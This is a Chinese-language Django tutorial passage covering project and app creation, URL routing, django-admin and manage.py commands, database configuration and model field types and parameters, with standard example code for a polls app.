['LocalePrefixPattern', 'NoReverseMatch', 'Resolver404', 'ResolverMatch', 'URLPattern', 'URLResolver', 'base', 'clear_script_prefix', 'clear_url_caches', 'conf', 'converters', 'exceptions', 'get_callable', 'get_mod_func', 'get_ns_resolver', 'get_resolver', 'get_script_prefix', 'get_urlconf', 'include', 'is_valid_path', 'path', 're_path', 'register_converter', 'resolve', 'resolvers', 'reverse', 'reverse_lazy', 'set_script_prefix', 'set_urlconf', 'translate_url', 'utils']

>>> print([e for e in dir(django.contrib) if not e.startswith('_')])
['admin', 'auth', 'contenttypes', 'messages', 'sessions', 'sites', 'staticfiles']

</textarea><pre>
创建项目、初始化设置
使用django需要用一些自动生成的代码配置一个Django project,一个Django项目实例需要的设置项集合包括数据库配置、Django配置和应用程序配置

创建mysite目录
django-admin startproject mysite

未找到django-admin命令的解决方法:
pip3 show Django
python3 /home/berlin75/.local/lib/python3.6/site-packages/django/bin/django-admin.py startproject mysite

mysite - 最外层的mysite/根目录是项目的容器
├── mysite - 里面一层的mysite/目录是整个项目的配置文件目录,是一个纯Python包,其名字是引用它内部任何东西时需用到的Python包名,如mysite.urls
│   ├── __init__.py - 一个空文件,告诉Python该目录是一个Python包
│   ├── settings.py - 该Django项目的主配置文件
│   ├── urls.py - 该Django项目的URL声明,路由文件,所有的任务都是从这里开始分配,一份由Django驱动的网站目录
│   └── wsgi.py - 一个基于WSGI的web服务器进入点,提供底层的网络通信功能,通常不用关心
└── manage.py - 一个可用各种方式来管理Django项目的命令行工具,是整个项目的管理脚本

启动Django自带的简易开发服务器
它是一个用纯Python写的轻量级的Web服务器,不需要进行配置生产级别的服务器如Apache、nginx方面的工作
会自动重新加载的服务器runserver,用于开发的服务器在需要的情况下会对每一次的访问请求重新载入一遍Python代码。所以不需要为了让修改的代码生效而频繁的重新启动服务器。然而一些动作如添加新文件将不会触发自动重新加载,这时得自己手动重启服务器
cd mysite
python3 manage.py runserver  以默认127.0.0.1:8000配置启动开发服务器
python3 manage.py runserver 8080
python3 manage.py runserver 0.0.0.0:8000  简写0:8000

创建应用
在Django中每一个应用都是一个Python包,并遵循着相同的约定。Django自带一个工具可帮助生成应用的基础目录结构
项目project和应用app:应用是一个专门做某件事、实现某个功能的网络应用程序,比如博客系统或公共记录的数据库或简单的投票程序,项目则是一个网站使用的配置和多个应用的集合,这些app组合成整个站点。项目可以包含很多个应用。应用可以被很多个项目使用
应用可以存放在任何Python path中定义的路径,app的存放位置可以是任何地点,在这个实践中将在manage.py同级目录下创建应用,这样它就可以作为顶级模块导入,而不是mysite的子模块

在manage.py所在的目录即项目根目录下运行以下命令来创建一个投票应用,系统自动生成polls应用的目录
python3 manage.py startapp polls

</pre>生成以下目录结构包括了投票应用的全部内容<textarea>
mysite/polls$ tree
.
├── __init__.py
├── admin.py
├── apps.py
├── migrations
│   └── __init__.py
├── models.py
├── tests.py
└── views.py

</textarea><textarea>
# 编写第一个视图polls/views.py
from django.http import HttpResponse

def index(request):
    return HttpResponse("Hello, world. You're at the polls index.")

# 为了调用该视图,需要编写urlconf也就是路由路径将一个URL映射到视图,新建polls/urls.py
from django.urls import path
from . import views

urlpatterns = [
    path('', views.index, name='index'),
]

# 在项目的主urls.py文件(根URLconf文件)中添加urlpattern条目,指向刚建立的polls这个app独有的urls文件即polls.urls模块,这里需要导入include模块
from django.contrib import admin
from django.urls import include, path

urlpatterns = [
    path('polls/', include('polls.urls')),
    path('admin/', admin.site.urls),
]

</textarea><pre>
函数include()允许引用其它URLconfs,相当于多级路由,Django遇到include()时会截断与此项匹配的URL的部分,并将剩余的字符串发送到下一级路由URLconf以供进一步处理。
设计include()的理念是使其可以即插即用,因为投票应用有它自己的URLconf(polls/urls.py),他们能够被放在"/polls/","/fun_polls/","/content/polls/"或其他任何路径下,这个应用都能够正常工作
项目根路由不关心具体app的路由策略,只管往指定的二级路由转发,实现了应用解耦。app所属的二级路由可以根据自己的需要随意编写,不会和其它的app路由发生冲突。app目录可以放置在任何位置,而不用修改路由。这是软件设计里很常见的一种模式

建议:除了admin路由(admin.site.urls)外,尽量给每个app设计自己独立的二级路由

函数path()具有四个参数,两个必须参数:route和view,两个可选参数:kwargs和name
route参数是一个匹配URL的准则,类似正则表达式,当Django响应一个请求时它会从urlpatterns的第一项开始按顺序依次匹配列表中的项,直到找到匹配的项,然后执行该条目映射的视图函数或下级路由,其后的条目将不再继续匹配。因此url路由的编写顺序非常重要。这些准则不会匹配GET和POST参数或域名。例如URLconf在处理请求https://www.example.com/myapp/和https://www.example.com/myapp/?page=3时都只会尝试匹配myapp/
view参数:view指的是处理当前url请求的视图函数。当Django匹配到某个路由条目时,自动将封装的HttpRequest对象作为第一个参数,被捕获的参数以关键字参数的形式,传递给该条目指定的视图view
kwargs参数:任意数量的关键字参数可以作为一个字典传递给目标视图函数
name参数:对URL进行命名,方便在Django的任意处尤其是模板内显式地引用它。这是一个非常强大的功能,相当于给URL取了个全局变量名,不会将url匹配地址写死,这个有用的特性允许只改一个文件就能全局地修改某个URL模式

现在把index视图添加进了URLconf,重启服务器验证是否正常工作,用浏览器访问http://localhost:8000/polls/,应该能够看见在index视图中定义的"Hello, world. You're at the polls index."

</pre>

<h4>django-admin和manage.py</h4><pre>
django-admin是用于管理Django的命令行工具集,成功安装Django后在操作系统中就会有这个命令
manage.py则是每个Django项目中自动生成的一个用于管理项目的脚本文件,需要通过python命令执行

有三种方式,可以执行Django提供的内置命令:其中的command是Django内置的或自定义的命令。
$ django-admin < command> [options]
$ manage.py < command> [options]
$ python -m django < command> [options]

有三种获取帮助信息的办法:
django-admin help:显示使用信息和命令列表。
django-admin help --commands:所有可用命令的列表。
django-admin help < command>:命令的介绍及其可用的参数列表。
django-admin version:获取当前使用的Django版本。
使用--verbosity参数指定django-admin将通知和调试信息打印到控制台。

Django内置命令选项
1. check
检查整个Django项目是否存在常见问题,默认所有应用都将被选中,可以通过提供app的名字检查指定的应用:
django-admin check auth admin myapp

2. dbshell
运行ENGINE设置中指定的数据库引擎的命令行客户端,其中USER,PASSWORD等指定连接参数。
--database DATABASE
指定打开某个数据库的shell。 默认为default。

3. diffsettings
django-admin diffsettings
显示当前设置文件与Django的默认设置之间的差异。

4. flush
django-admin flush
从数据库中删除所有数据。已应用的迁移不会被清除。只删除具体数据,不删除数据表！
如果希望从空数据库启动并重新运行所有迁移,则应该删除并重新创建数据库,然后再运行migrate,这样会连原来的数据表都删了。

5. makemigrations
django-admin makemigrations [app_label [app_label ...]]
根据检测到的模型创建新的迁移。迁移的作用更多的是将数据库的操作以文件的形式记录下来,方便以后检查、调用、重做等,尤其是对于Git版本管理,它无法获知数据库是如何变化的,只能通过迁移文件中的记录来追溯和保存。

6. migrate
django-admin migrate [app_label] [migration_name]
使数据库状态与当前模型集和迁移集同步。说白了,就是将对数据库的更改,主要是数据表设计的更改,在数据库中真实执行。例如,新建、修改、删除数据表,新增、修改、删除某数据表内的字段等等。

7. runserver
django-admin runserver [addrport]
启用Django提供的轻量级的开发用的Web服务器。默认服务器运行在IP地址127.0.0.1的8000端口上。如果要自定义服务器端口和地址,可以显式地传递一个IP地址和端口号给它。
在Linux中,如果以一个普通用户的身份来运行脚本,可能没有权限在低位端口上运行。低端口数(即1024以下)是预留出来给超级用户root的。
这个服务器使用的WSGI application对象是在WSGI_APPLICATION中设置的。
不要在生产环境中使用这个服务器。
通常每当代码有变化时,这个服务器会自动重启,但这不是绝对的,所以为了不出意外,每次测试时还是手动重启一下吧。
当启动服务器之后,在服务器运行过程中每当Python代码有变更时,系统的检测框架将会检查整个项目中是否存在一些直观的错误,如果检测到了错误,这些错误信息将会输出至标准输出。
可以同时启动多个服务器,只要它们在不同的端口上,多次执行django-admin runserver ...即可。
默认的IP为127.0.0.1,它是不可被网络中的其它主机所访问的,只能本机。要使网络上的其他计算机可以访问开发服务器,请使用自己的IP地址(例如192.168.2.1)或0.0.0.0或 :: (启用IPv6)。也可以使用只包含ASCII码的主机名.
Django开发服务器,默认支持多线程,可以通过--nothreading参数关闭。

端口8000在IP地址127.0.0.1:
django-admin runserver
端口8000在IP地址1.2.3.4:
django-admin runserver 1.2.3.4:8000
端口7000在IP地址127.0.0.1:
django-admin runserver 7000
端口7000在IP地址1.2.3.4:
django-admin runserver 1.2.3.4:7000
端口8000在IPv6地址::1:
django-admin runserver -6
端口7000在IPv6地址::1:
django-admin runserver -6 7000
端口7000在IPv6地址2001:0db8:1234:5678::9:
django-admin runserver [2001:0db8:1234:5678::9]:7000
端口8000在主机的IPv4地址localhost:
django-admin runserver localhost:8000
端口8000在主机的IPv6地址localhost:
django-admin runserver -6 localhost:8000

8. shell
django-admin shell
启动带有Django环境的Python交互式解释器即命令行环境。默认使用基本的python交互式解释器,是测试和开发过程中不可或缺的部分
--interface {ipython,bpython,python}, -i {ipython,bpython,python}指定要使用的shell。 默认Django将使用IPython或bpython。如果同时安装了两个请指定想要的那个
使用IPython:
django-admin shell -i ipython
使用bpython:
django-admin shell -i bpython

9. startapp
django-admin startapp name [directory]
创建新的app,默认会在这个新的app目录下创建一系列文件模版,比如models.py、views.py、admin.py等等。

10. startproject
django-admin startproject name [directory]
新建工程,默认新目录包含manage.py脚本和项目包(包含settings.py和其他文件)。

11. test
django-admin test [test_label [test_label ...]]
运行所有已安装的app的测试代码。

二、app提供的命令:一些内置app比如auth等提供的命令项,它们只在对应的app启用的时候才可用
1. changepassword
此命令仅在安装了Django的authentication system(django.contrib.auth)时可用。
该命令用于更改用户的密码,它会提示为给定用户输入两次新密码。如果两次输入相同则立即成为新密码。 如果不提供用户名,该命令将尝试更改与当前用户匹配的用户名的密码。
django-admin changepassword tom

2. createsuperuser
此命令仅在安装了Django的authentication system(django.contrib.auth)时可用。
创建超级用户帐户,如果需要创建初始超级用户帐户或需要以编程方式为网站生成超级用户帐户,这将非常有用。
以交互方式运行时此命令将提示输入新超级用户的密码。
当以非交互方式运行时,将不会设置密码,并且超级用户帐户将无法登录,直到为其手动设置密码。
可以使用命令行上的--username和--email参数提供新帐户的用户名和电子邮件地址。如果未提供其中任何一个,则createsuperuser将在以交互方式运行时提示输入。

3. clearsessions
清除过期的会话,可以作为cron定期作业或直接运行。

4. collectstatic
仅当安装了static files application(django.contrib.staticfiles)时此命令才可用。
用于在线上环境,当DEBUG设置为False时将静态文件等统一集中到一个目录下,为Web服务器提供静态文件支持。

三、 共有参数:每种命令都有自己特定的参数选项,但下面几个是所有命令都可以使用的参数
1. --pythonpath PYTHONPATH
将给定的文件系统路径添加到Python的模块导入搜索路径(import search path),如果未提供则django-admin将使用PYTHONPATH环境变量的值。
django-admin migrate --pythonpath='/home/djangoprojects/myproject'

2. --settings SETTINGS
指定要使用的配置文件,例如mysite.settings,如果未提供则django-admin将使用DJANGO_SETTINGS_MODULE环境变量的值。
django-admin migrate --settings=mysite.settings

3. --traceback
当引发CommandError时,显示完整的错误栈信息。默认情况下django-admin将显示一个简单的错误消息。
django-admin migrate --traceback

4. --verbosity {0,1,2,3}, -v
指定向控制台打印消息的方式。
0表示无输出。
1表示正常输出(默认)。
2表示详细输出。
3表示非常详细输出。
django-admin migrate --verbosity 2

5. --no-color
禁用彩色的输出信息。 一些命令会给它输出的内容添加色彩。例如,错误将以红色打印到控制台,SQL语句将突出显示语法。
django-admin runserver --no-color

四、在代码中调用管理命令
要在代码中调用管理命令,需要使用call_command方法
django.core.management.call_command(name, args, *options)
name参数:要调用的命令的名称或命令对象。
*args参数:该命令接受的参数列表,例如call_command('flush', ' - verbosity = 0')
**options参数:传递给命名的选项,例如call_command('flush', verbosity = 0)

from django.core import management
from django.core.management.commands import loaddata
management.call_command('flush', verbosity=0, interactive=False)
management.call_command('loaddata', 'test_data', verbosity=0)
management.call_command(loaddata.Command(), 'test_data', verbosity=0)

命名参数可以通过使用以下语法之一传递:
# Similar to the command line
management.call_command('dumpdata', '--natural-foreign')

# Named argument similar to the command line minus the initial dashes and
# with internal dashes replaced by underscores
management.call_command('dumpdata', natural_foreign=True)

# `use_natural_foreign_keys` is the option destination variable
management.call_command('dumpdata', use_natural_foreign_keys=True)

有多个参数时,传递列表:
management.call_command('dumpdata', exclude=['contenttypes', 'auth'])

可以重定向标准输出和错误流,因为所有命令都支持stdout和stderr选项。 例如:
with open('/path/to/command_output') as f: management.call_command('dumpdata', stdout=f)

</pre>
</div>

<div id="django_db">
<h4>数据库配置</h4><pre>
mysite/settings.py配置文件是包含了Django项目设置的Python模块,这是整个Django项目的设置中心
通常这个配置文件使用python内置的SQLite作为默认数据库,所以无需额外安装。当开始一个真正的项目时可能更倾向使用一个更具扩展性的数据库如MySQL,避免以后数据库迁移的相关问题

如果想使用其他的数据库请先安装相应的数据库操作模块,并将settings文件中DATABASES位置的'default'的键值进行相应的修改用于连接数据库:
ENGINE:可选值有'django.db.backends.sqlite3','django.db.backends.postgresql','django.db.backends.mysql'或'django.db.backends.oracle'等
NAME:类似Mysql数据库管理系统中用于保存项目内容的数据库的名字,如果使用默认的SQLite,那么数据库将作为一个文件将存放在本地机器内,此时的NAME应该是这个文件的完整绝对路径包括文件名,默认值os.path.join(BASE_DIR, 'db.sqlite3'),将把该文件储存在项目目录下,如果不使用SQLite则必须添加一些额外设置如USER、PASSWORD、HOST等

</pre>基于pymysql操作Mysql数据库的例子<textarea>
import pymysql         # 一定要添加这两行！通过pip install pymysql！
pymysql.install_as_MySQLdb()

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'mysite',
        'HOST': '192.168.1.1',
        'USER': 'root',
        'PASSWORD': 'pwd',
        'PORT': '3306',
    }
}

</textarea><pre>
迁移数据：sqlite->mysql
使用django导出导入数据的命令完成迁移
python3 manage.py dumpdata > data.json
python3 manage.py loaddata data.json

如果使用SQLite以外的数据库,请确认在使用前已经创建了数据库,可以通过在的数据库交互式命令行中使用"CREATE DATABASE database_name;"命令
还要确保该数据库用户中提供mysite/settings.py具有"create database"权限自动创建的test database
如果使用SQLite,那么不需要在使用前做任何事,数据库会在需要的时候自动创建

在修改settings文件时将TIME_ZONE设置为国内所在的时区Asia/Shanghai

settings.py文件顶部的INSTALLED_APPS设置项,它列出了所有的项目中被激活的Django应用(app)。必须将自定义的app注册在这里。每个应用可以被多个项目使用,并且可以打包和分发给其他人在他们的项目中使用

INSTALLED_APPS默认包括了以下Django的自带应用,它们都是Django自动生成的,这些应用被默认启用是为了给常规项目提供方便
django.contrib.admin:admin管理后台站点
django.contrib.auth:身份认证系统
django.contrib.contenttypes:内容类型框架
django.contrib.sessions:会话框架
django.contrib.messages:消息框架
django.contrib.staticfiles:静态文件管理框架

上面的一些应用也需要建立一些数据库表,所以在使用它们之前要在数据库中创建这些表,使用下面的命令创建数据表
$ python3 manage.py migrate
migrate命令将遍历INSTALLED_APPS设置中的所有项目,在数据库中创建对应的表,并打印出每一条动作信息,至于具体会创建什么取决于mysite/settings.py设置文件和每个应用的数据库迁移文件。这个命令所执行的每个迁移操作都会在终端中显示出来。如果感兴趣的话运行数据库的命令行工具并输入\dt(PostgreSQL), SHOW TABLES;(MySQL), .schema(SQLite)或SELECT TABLE_NAME FROM USER_TABLES;(Oracle)来列出Django所创建的表

为了方便大多数项目默认激活了一些应用,但如果不需要某个或某些应用,可以在运行migrate前从INSTALLED_APPS里注释或删除掉它们,migrate命令只会为在INSTALLED_APPS里声明了的应用进行数据库迁移

【 模型层 】
在MVC或MTV设计模式中模型M代表对数据库的操作
ORM将一个Python的对象映射为数据库中的一张关系表,它将SQL封装起来,程序员不用关心数据库的具体操作,只需专注于代码和业务逻辑的实现
整体的实现过程就是:Python代码通过ORM转换成SQL语句,再通过pymysql去实际操作数据库

Django自带ORM系统,不需要额外安装别的ORM。当然也可以安装并使用其它的ORM,比如最典型的ORM就是SQLAlchemy,但是不建议这么做,因为Django系统庞大,集成完善,模型层与视图层、模板层结合得比较紧密,使用自带的ORM更方便更可靠,并且Django自带的ORM功能也非常强大

Django的ORM系统体现在框架内就是模型层。想要理解模型层的概念,关键在于理解用Python代码的方式来定义数据库表的做法！一个Python的类,就是一个模型,代表数据库中的一张数据表！Django奉行Python优先的原则,一切基于Python代码的交流,完全封装SQL内部细节

【 创建模型 】
在Django里写一个数据库驱动的Web应用的第一步是定义模型,也就是数据库结构设计和附加的其它元数据。
模型准确且唯一的描述了数据,它包含储存的数据的重要字段和行为,一般来说每一个模型都映射一张数据库表。
Django遵循DRY Principle,它的目标是只需要定义数据模型,通过模型Django提供了一个自动生成访问数据库的API

迁移
举个例子,不像Ruby On Rails,Django的迁移代码是由模型文件自动生成的,它本质上只是个历史记录,Django可以用它来进行数据库的滚动更新,通过这种方式使其能够和当前的模型匹配。

在投票应用中需要创建两个模型:Question和Choice。Question模型包括问题描述和发布时间,Choice模型有两个字段选项描述和当前得票数,每一条Choice都关联到一个Question。这些都是由Python的类来体现,编写的全是Python的代码,不接触任何SQL语句,编辑polls/models.py文件:

</pre><textarea>
from django.db import models

class Question(models.Model):
    question_text = models.CharField(max_length=200)
    pub_date = models.DateTimeField('date published')  # 字段备注名

class Choice(models.Model):
    question = models.ForeignKey(Question, on_delete=models.CASCADE) # 使用ForeignKey定义关联关系,每个Choice对象都关联到一个Question对象
    choice_text = models.CharField(max_length=200)
    votes = models.IntegerField(default=0)             # 字段默认值

</textarea><pre>
Django通过自定义Python类的形式来定义具体的模型,每个模型都是一个Python的类,这些类继承django.db.models.Model,每个模型代表数据库中的一张表,每个类的实例代表数据表中的一行数据,类中的每个变量代表数据表中的一列字段。
Django通过模型将Python代码和数据库操作结合起来,实现对SQL查询语言的封装。也就是说可以不会管理数据库,可以不会SQL语言,同样能通过Python的代码进行数据库的操作。Django通过ORM对数据库进行操作,奉行代码优先的理念,将Python程序员和数据库管理员进行分工解耦

Django不允许下面两种字段名:
1、与Python关键字冲突,这会导致语法错误
class Example(models.Model): pass = models.IntegerField() # 'pass'是Python保留字！
2、字段名中不能有两个以上下划线在一起,因为两个下划线是Django的查询语法
class Example(models.Model): foo__bar = models.IntegerField() # 'foo__bar' 有两个下划线在一起!

每个字段都是Field类的实例,比如字符字段为CharField,日期时间字段为DateTimeField,这将告诉Django每个字段要处理的数据类型。
每一个Field实例的名字就是字段的名字如question_text或pub_date,在Python代码中会使用这个值,数据库也会将这个值作为表的列名

【 字段类型 】
字段类型的作用:
决定数据库中对应列的数据类型,例如:INTEGER,VARCHAR,TEXT
HTML中对应的表单标签的类型,例如< input type="text" />
在admin后台和自动生成的表单中最小的数据验证需求

Django内置了许多字段类型,它们都位于django.db.models中,例如models.CharField。这些类型基本满足需求,如果还不够也可以自定义字段

常用字段类型
AutoField
一个自动增加的整数类型字段。通常不需要自己编写它,Django会自动添加字段:id = models.AutoField(primary_key=True),这是一个自增字段,从1开始计数。如果非要自己设置主键,那么请务必将字段设置为primary_key=True。Django在一个模型中只允许有一个自增字段,并且该字段必须为主键

BooleanField
class BooleanField(**options)
布尔值类型。默认值是None。在HTML表单中体现为CheckboxInput标签。如果要接收null值,请使用NullBooleanField

NullBooleanField
类似布尔字段,只不过额外允许NULL作为选项之一

CharField
class CharField(max_length=None, **options)
字符串类型。必须接收一个max_length参数,表示字符串长度不能超过该值。默认的表单标签是input text。最常用的filed

DateField
class DateField(auto_now=False, auto_now_add=False, **options)
日期类型,一个Python中的datetime.date的实例。在HTML中表现为TextInput标签。在admin后台中Django会自动添加一个JS的日历表和一个"Today"快捷方式,以及附加的日期合法性验证
两个重要参数:参数互斥,不能共存
auto_now:每当对象被保存时将字段设为当前日期,常用于保存最后修改时间
auto_now_add:每当对象被创建时设为当前日期,常用于保存创建日期,它是不可修改的
设置上面两个参数就相当于给field添加了editable=False和blank=True属性。如果想具有修改属性,请用default参数。例子:pub_time = models.DateField(auto_now_add=True),自动添加发布时间。

from django.utils import timezone
date = models.dateField(default=timezone.now)

DateTimeField
class DateTimeField(auto_now=False, auto_now_add=False, **options)
日期时间类型。Python的datetime.datetime的实例。与DateField相比就是多了小时、分和秒的显示,其它功能、参数、用法、默认值等都一样。

TimeField
时间字段,Python中datetime.time的实例。接收同DateField一样的参数,只作用于小时、分和秒。

CommaSeparatedIntegerField
逗号分隔的整数类型。必须接收一个max_length参数。常用于表示较大的金额数目,例如1,000,000元。

DecimalField
class DecimalField(max_digits=None, decimal_places=None, **options)
固定精度的十进制小数。相当于Python的Decimal实例,必须提供两个指定的参数,参数max_digits:最大的位数,必须大于或等于小数点位数 。decimal_places:小数点位数,精度。 当localize=False时它在HTML表现为NumberInput标签,否则是text类型
例子:储存最大不超过999,带有2位小数位精度的数,定义models.DecimalField(..., max_digits=5, decimal_places=2)

FloatField
class FloatField(**options)
浮点数类型

IntegerField
class IntegerField(**options)
整数类型,最常用的字段之一。取值范围-2147483648到2147483647。在HTML中表现为NumberInput标签

TextField
class TextField(**options)
大量文本内容,在HTML中表现为Textarea标签,最常用的字段类型之一！如果为它设置一个max_length参数,那么在前端页面中会受到输入字符数量限制,然而在模型和数据库层面却不受影响。只有CharField才能同时作用于两者

GenericIPAddressField
class GenericIPAddressField(protocol='both', unpack_ipv4=False, **options)
IPV4或者IPV6地址,字符串形式,例如192.0.2.30或2a02:42fe::4,在HTML中表现为TextInput标签。参数protocol默认值为'both',可选'IPv4'或'IPv6',表示IP地址类型。

EmailField
邮箱类型,默认max_length最大长度254位。使用这个字段的好处是,可以使用DJango内置的EmailValidator进行邮箱地址合法性验证。

FilePathField
class FilePathField(path=None, match=None, recursive=False, max_length=100, **options)
文件路径类型,一种用来保存文件路径信息的字段。在数据表内以字符串的形式存在,默认最大长度100,可以通过max_length参数设置。

它包含有下面的一些参数:
path:必须指定的参数,表示一个系统绝对路径。
match:可选参数,一个正则表达式,用于过滤文件名。只匹配基本文件名,不匹配路径。例如foo.*\.txt$,只匹配文件名foo23.txt,不匹配bar.txt与foo23.png。
recursive:可选参数,只能是True或False。默认False。决定是否包含子目录,也就是是否递归的意思。
allow_files:可选参数,只能是True或者False。默认为True。决定是否应该将文件名包括在内。它和allow_folders其中,必须有一个为True。
allow_folders: 可选参数,只能是True或者False。默认为False。决定是否应该将目录名包括在内。

比如:
FilePathField(path="/home/images", match="foo.*", recursive=True)
它只匹配/home/images/foo.png,但不匹配/home/images/foo/bar.png,因为默认情况,只匹配文件名,而不管路径是怎么样的。

FileField
class FileField(upload_to=None, max_length=100, **options)
上传文件类型,上传文件字段,不能设置为主键。默认情况下该字段在HTML中表现为一个ClearableFileInput标签。在数据库内实际保存的是一个字符串类型,默认最大长度100,可以通过max_length参数自定义。真实的文件是保存在服务器的文件系统内的。

重要参数upload_to用于设置上传地址的目录和文件名
# 文件被传至`MEDIA_ROOT/uploads`目录,MEDIA_ROOT在settings文件中设置
upload = models.FileField(upload_to='uploads/')
# 或被传到`MEDIA_ROOT/uploads/2015/01/30`目录,增加了一个时间划分,自动实现了根据日期生成目录的方式
upload = models.FileField(upload_to='uploads/%Y/%m/%d/')

upload_to参数也可以接收一个回调函数,该函数返回具体的路径字符串
# 文件上传到MEDIA_ROOT/user_< id>/< filename>目录中
def user_directory_path(instance, filename): return 'user_{0}/{1}'.format(instance.user.id, filename)
class MyModel(models.Model): upload = models.FileField(upload_to=user_directory_path)

ImageField
class ImageField(upload_to=None, height_field=None, width_field=None, max_length=100, **options)
图像类型,用于保存图像文件的字段。其基本用法和特性与FileField一样,只不过多了两个属性height和width。默认情况下该字段在HTML中表现为一个ClearableFileInput标签。在数据库内实际保存的是一个字符串类型,默认最大长度100,可以通过max_length参数自定义。真实的图片是保存在服务器的文件系统内的
height_field参数:保存有图片高度信息的模型字段名。 width_field参数:保存有图片宽度信息的模型字段名
使用Django的ImageField需要提前安装pillow模块,pip install pillow即可。

使用FileField或ImageField字段的步骤:
1、在settings文件中配置MEDIA_ROOT作为上传文件在服务器中的基本路径,为了性能考虑这些文件不会被储存在数据库中。再配置个MEDIA_URL作为公用URL指向上传文件的基本路径,请确保Web服务器的用户账号对该目录具有写的权限。
2、添加FileField或ImageField字段到模型中,定义好upload_to参数,文件最终会放在MEDIA_ROOT目录的"upload_to"子目录中。
3、所有真正被保存在数据库中的只是指向上传文件路径的字符串而已。可以通过url属性,在Django的模板中方便的访问这些文件。假设有一个ImageField字段名叫mug_shot,那么在Django模板的HTML文件中可以使用{{ object.mug_shot.url }}来获取该文件。其中的object用具体的对象名称代替。
4、可以通过name和size属性,获取文件的名称和大小信息。

URLField
一个用于保存URL地址的字符串类型,默认最大长度200。

UUIDField
用于保存通用唯一识别码(Universally Unique Identifier)的字段。使用Python的UUID类。在PostgreSQL数据库中保存为uuid类型,其它数据库中为char(32),这个字段是自增主键的最佳替代品
数据库无法自己生成uuid,因此需要如下使用default参数:

</pre><textarea>
from django.db import models
import uuid     # Python的内置模块

class MyUUIDModel(models.Model):
    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)
    # 其它字段

</textarea><pre>
【 字段参数 】
定义某些Field类实例需要特定的参数,如CharField需要一个max_length参数用以指定数据库存储VARCHAR数据时用的字节数。这个参数的用处不止于用来定义数据库结构,也用于验证数据

一些可选的参数是通用的,可以用于任何字段类型,常用到的通用参数:
1、null
该值为True时Django在数据库用NULL保存空值,默认False。对于保存字符串类型数据的字段尽量避免将此参数设为True,那样会导致两种'没有数据'的情况,一种是NULL,另一种是'空字符串'

2、blank
True时字段可以为空。默认False。和null参数不同的是,null是纯数据库层面的,而blank是验证相关的,它与表单验证是否允许输入框内为空有关,与数据库无关。所以要小心一个null为False但blank为True的字段接收到一个空值可能会出bug或异常。

3、default
该字段的默认值。可以是一个值或可调用的对象,如果是个可调用对象则每次实例化模型创建新对象时都会调用该对象
设置的默认值不能是一个可变对象,比如列表、集合等等。lambda匿名函数也不可用于default的调用对象,因为匿名函数不能被migrations序列化
在某种原因不明的情况下将default设置为None,可能会引发intergyerror:not null constraint failed,即非空约束失败异常,导致python manage.py migrate失败,此时可将None改为False或其它的值,只要不是None就行

4、help_text
额外显示在表单控件上的帮助文本。使用时请注意转义为纯文本,防止脚本攻击,即便字段未用于表单,它对于生成文档也是很有用的

5、choices
用于页面上的选择框标签,需要先提供一个二维的二元元组,每个二元组的第一个元素表示存在数据库内真实的值,第二个表示页面表单中显示的具体内容。在浏览器页面上将显示第二个元素的值,每当choices的顺序变动时将会创建新的迁移

</pre><textarea>
一个选项列表:
YEAR_IN_SCHOOL_CHOICES = (
    ('FR', 'Freshman'),
    ('SO', 'Sophomore'),
    ('JR', 'Junior'),
    ('SR', 'Senior'),
    ('GR', 'Graduate'),
)

# 一般来说最好将选项定义在类里,并取一个直观的名字
from django.db import models
class Student(models.Model):
    FRESHMAN = 'FR'
    SOPHOMORE = 'SO'
    JUNIOR = 'JR'
    SENIOR = 'SR'
    YEAR_IN_SCHOOL_CHOICES = (
        (FRESHMAN, 'Freshman'),
        (SOPHOMORE, 'Sophomore'),
        (JUNIOR, 'Junior'),
        (SENIOR, 'Senior'),
    )
    year_in_school = models.CharField(max_length=2, choices=YEAR_IN_SCHOOL_CHOICES, default=FRESHMAN)

    def is_upperclass(self):
        return self.year_in_school in (self.JUNIOR, self.SENIOR)

# 对于一个模型实例,要获取该字段二元组中相对应的第二个值使用get_FOO_display()方法
from django.db import models
class Person(models.Model):
    SHIRT_SIZES = (('S', 'Small'), ('M', 'Medium'), ('L', 'Large'))
    name = models.CharField(max_length=60)
    shirt_size = models.CharField(max_length=1, choices=SHIRT_SIZES)
>>> p = Person(name="Fred Flintstone", shirt_size="L")
>>> p.save()
>>> p.shirt_size  # 'L'
>>> p.get_shirt_size_display()  # 'Large'

</textarea><pre>
6、primary_key
如果设置为True,将该字段设置为该模型的主键,primary_key=True隐含null=False和unique=True的意思。一个模型中只能有一个主键字段

在一个模型中如果没有对任何一个字段设置primary_key=True,Django会给每一个模型添加自增主键id字段,因此除非想重写Django默认的主键设置行为,可以不手动设置主键
id = models.AutoField(primary_key=True)

</pre>主键字段是只可读的,如果修改一个模型实例的主键并保存,这等同于创建了一个新的模型实例对象,并不会修改原来的对象<textarea>
from django.db import models
class Fruit(models.Model):
    name = models.CharField(max_length=100, primary_key=True)
>>> fruit = Fruit.objects.create(name='Apple')
>>> fruit.name = 'Pear'
>>> fruit.save()
>>> Fruit.objects.values_list('name', flat=True)
< QuerySet ['Apple', 'Pear']>

</textarea><pre>
7、unique
设置为True时这个字段的值必须在整个表中保持唯一
对于ManyToManyField和OneToOneField关系类型,该参数无效。
当unique=True时,db_index参数无须设置,因为unqiue隐含了索引。
unique参数可以用于FileField字段

8、verbose_name字段备注名
除了ForeignKey、ManyToManyField和OneToOneField,任何字段类型都接收一个可选的位置参数verbose_name,如果未指定该参数值Django会自动使用字段的属性名作为该参数值,并且把下划线转换为空格
first_name = models.CharField("person's first name", max_length=30) # 备注名为"person's first name"
first_name = models.CharField(max_length=30) # 备注名为"first name"

9、db_column
该参数用于定义当前字段在数据表内的列名。如果未指定Django将使用字段名作为列名。

10、db_index
该参数接收布尔值。如果为True数据库将为该字段创建索引。

11、db_tablespace
用于字段索引的数据库表空间的名字,前提是当前字段设置了索引。默认值为工程的DEFAULT_INDEX_TABLESPACE设置。如果使用的数据库不支持表空间,该参数会被忽略。

12、editable
默认True,设为False时当前字段将不会在admin后台或者它的ModelForm表单中显示,同时还会被模型验证功能跳过

13、error_messages
用于自定义错误信息。参数接收字典类型的值。字典的键可以是null、 blank、 invalid、 invalid_choice、 unique和unique_for_date其中的一个。

14、unique_for_date
日期唯一,如果有一个名叫title的字段,并设置了参数unique_for_date="pub_date",那么Django将不允许有两个模型对象具备同样的title和pub_date。有点类似联合约束。

15、unique_for_month
同上,只是月份唯一。

16、unique_for_year
同上,只是年份唯一。

17、validators
运行在该字段上的验证器的列表

</pre>

<h4>关联关系 关系类型字段</h4><pre>
